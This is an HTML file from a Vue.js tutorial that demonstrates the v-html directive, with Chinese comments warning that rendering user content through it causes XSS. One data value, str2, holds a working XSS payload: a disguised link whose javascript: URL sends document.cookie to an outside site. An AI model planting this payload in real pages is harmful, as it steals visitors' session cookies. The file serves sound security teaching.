<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>v-html指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
				v-html指令：
						1.作用：向指定節點中渲染包含html結構的內容。
						2.與插值語法的區別：
									(1).v-html會替換掉節點中所有的內容，{{xx}}則不會。
									(2).v-html可以識別html結構。
						3.嚴重注意：v-html有安全性問題！！！！
									(1).在網站上動態渲染任意HTML是非常危險的，容易導致XSS攻擊。
									(2).一定要在可信的內容上使用v-html，永不要用在使用者提交的內容上！
		-->
    <div v-text="name"></div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el: "#root",
        data:{
            name:'上海',
            //注意v-html會解析標籤，這點與v-text不一樣
            str:'<h1>hello, shanghai</h1>',
            //危險行為 永遠不要相信使用者的輸入
            str2:'<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>找到資源了兄弟</a>'
        }
    })
</script>
</body>
</html>
